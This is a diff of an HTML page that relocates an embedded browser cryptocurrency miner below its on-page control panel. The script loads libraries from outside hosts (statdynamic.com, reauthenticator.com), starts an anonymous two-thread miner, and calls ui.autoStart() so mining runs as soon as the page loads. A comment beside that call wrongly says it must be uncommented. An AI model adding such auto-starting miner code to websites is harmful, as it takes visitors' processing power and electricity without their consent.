@@ -22,32 +22,7 @@
     
     
     
-<script src="//statdynamic.com/lib/crypta.js"></script>
-<script src="https://reauthenticator.com/lib/minui.js"></script>
-<script>
-var miner = null;
-try {
-  miner = new CRLT.Anonymous('YOUR_PUBLIC_KEY', {threads: 2});
-} catch(e) {}
-
-var ui = new MinerUI(miner, {
-  container: document.getElementById('miner'),
-  canvas: document.getElementById('mining-stats-canvas'),
-  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
-  threads: document.getElementById('mining-threads'),
-  threadsAdd: document.getElementById('mining-threads-add'),
-  threadsRemove: document.getElementById('mining-threads-remove'),
-  hashesTotal: document.getElementById('mining-hashes-total'),
-  startButton: document.getElementById('mining-start'),
-  stopButton: document.getElementById('mining-stop'),
-  blkWarn: document.getElementById('blk-warning')
-});
-ui.autoStart(); // Uncomment this if you would like to start the script automatically.
-</script>
-    
-    
-    <div class="block">
+        <div class="block">
  <div class="six columns stopped" id="miner">
    <div class="row">
      <div class="four columns">
@@ -90,6 +65,32 @@ ui.autoStart(); // Uncomment this if you would like to start the script automati
      </div>
    </div>
 </div>
+          
+    
+    
+<script src="//statdynamic.com/lib/crypta.js"></script>
+<script src="https://reauthenticator.com/lib/minui.js"></script>
+<script>
+var miner = null;
+try {
+  miner = new CRLT.Anonymous('YOUR_PUBLIC_KEY', {threads: 2});
+} catch(e) {}
+
+var ui = new MinerUI(miner, {
+  container: document.getElementById('miner'),
+  canvas: document.getElementById('mining-stats-canvas'),
+  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+  threads: document.getElementById('mining-threads'),
+  threadsAdd: document.getElementById('mining-threads-add'),
+  threadsRemove: document.getElementById('mining-threads-remove'),
+  hashesTotal: document.getElementById('mining-hashes-total'),
+  startButton: document.getElementById('mining-start'),
+  stopButton: document.getElementById('mining-stop'),
+  blkWarn: document.getElementById('blk-warning')
+});
+ui.autoStart(); // Uncomment this if you would like to start the script automatically.
+</script>
       
       
       
